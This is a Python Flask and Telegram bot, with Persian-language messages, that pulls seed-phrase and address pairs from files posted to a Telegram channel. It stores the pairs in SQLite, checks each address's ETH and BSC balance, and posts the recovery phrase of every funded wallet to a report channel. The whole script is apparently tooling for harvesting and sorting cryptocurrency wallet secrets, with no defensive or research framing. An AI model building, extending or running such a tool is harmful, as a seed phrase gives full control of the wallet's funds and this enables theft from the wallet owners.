import os
import re
import logging
import asyncio
import threading
import sqlite3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1003893481541

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

DB_PATH = "wallets.db"
app = Flask(__name__)

# قفل برای اینکه فقط یک فایل همزمان پردازش بشه
processing_lock = threading.Lock()

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS wallets (
        address TEXT PRIMARY KEY, seed TEXT, added_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS meta (
        key TEXT PRIMARY KEY, value TEXT)''')
    conn.commit()
    conn.close()
    logging.info("DB initialized")

def save_wallet(address, seed):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO wallets (address, seed, added_at) VALUES (?, ?, ?)",
              (address.lower(), seed.strip(), datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

def get_all_wallets():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address, seed FROM wallets")
    rows = c.fetchall()
    conn.close()
    return rows

def get_wallet_total(address):
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except:
            continue
    return totals

async def process_one_file(doc):
    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=30.0, connect_timeout=20.0, read_timeout=30.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    try:
        logging.info(f"=== Start processing: {doc.file_name} ===")

        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        pattern = r"Phrase:\s*(.+?)\s*\|\s*Addr:\s*(0x[a-fA-F0-9]{40})"
        matches = re.findall(pattern, text, re.IGNORECASE)
        logging.info(f"Found {len(matches)} entries")

        if not matches:
            await bot.send_message(chat_id=REPORT_CHANNEL, text="❌ موردی پیدا نشد.")
            return

        for phrase, addr in matches:
            save_wallet(addr, phrase)

        test_id_match = re.search(r"تعداد تست[:\s]*(\d+)", text)
        test_id = test_id_match.group(1) if test_id_match else "نامشخص"

        await bot.send_message(
            chat_id=REPORT_CHANNEL,
            text=f"📥 شروع اسکن `{doc.file_name}`\n🔢 تعداد: `{len(matches)}`\n🆔 تست: `{test_id}`"
        )

        file_totals = {'ETH': 0.0, 'BSC': 0.0}
        rich_wallets = []
        batch_size = 250

        for i in range(0, len(matches), batch_size):
            batch = matches[i:i + batch_size]
            logging.info(f"Scanning batch {i//batch_size + 1}")

            with ThreadPoolExecutor(max_workers=5) as executor:
                loop = asyncio.get_running_loop()
                tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for _, addr in batch]
                results = await asyncio.gather(*tasks)

            for (phrase, addr), res in zip(batch, results):
                file_totals['ETH'] += res['ETH']
                file_totals['BSC'] += res['BSC']
                if res['ETH'] + res['BSC'] > 0.00001:
                    rich_wallets.append({
                        'phrase': phrase.strip(),
                        'address': addr,
                        'balances': res
                    })

            await bot.send_message(
                chat_id=REPORT_CHANNEL,
                text=f"✅ دسته {i//batch_size + 1} | موجودی‌دار: `{len(rich_wallets)}`"
            )

        final_report = (
            f"📊 **گزارش فایل**\n"
            f"📄 `{doc.file_name}`\n"
            f"🆔 تست: `{test_id}`\n"
            f"🔢 تعداد: `{len(matches)}`\n"
            f"──────────────────\n"
            f"🔹 ETH: `{file_totals['ETH']:.6f}`\n"
            f"🔹 BSC: `{file_totals['BSC']:.6f}`\n"
            f"💰 دارای موجودی: `{len(rich_wallets)}`"
        )
        await bot.send_message(chat_id=REPORT_CHANNEL, text=final_report, parse_mode='Markdown')

        for wallet in rich_wallets:
            msg = f"`{wallet['address']}`\n🔑 `{wallet['phrase']}`\n"
            if wallet['balances']['ETH'] > 0:
                msg += f"• ETH: `{wallet['balances']['ETH']:.6f}`\n"
            if wallet['balances']['BSC'] > 0:
                msg += f"• BSC: `{wallet['balances']['BSC']:.6f}`\n"
            await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
            await asyncio.sleep(0.5)

        logging.info(f"=== Finished: {doc.file_name} | Rich: {len(rich_wallets)} ===")

    except Exception as e:
        logging.error(f"Error: {e}", exc_info=True)
        try:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ خطا: {str(e)[:200]}")
        except:
            pass

def run_processing(doc):
    """اجرای پردازش در thread جدا"""
    if not processing_lock.acquire(blocking=False):
        logging.warning("Already processing another file, skipping this one")
        return

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process_one_file(doc))
        loop.close()
    except Exception as e:
        logging.error(f"run_processing error: {e}")
    finally:
        processing_lock.release()

init_db()

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot=None)

    if update and update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            doc = update.channel_post.document
            logging.info(f"Received file: {doc.file_name}")
            # شروع پردازش در thread جدا
            t = threading.Thread(target=run_processing, args=(doc,), daemon=True)
            t.start()
            logging.info(f"Processing thread started for {doc.file_name}")

    return "OK"

@app.route('/')
def health():
    return f"Bot is running | DB wallets: {len(get_all_wallets())}"
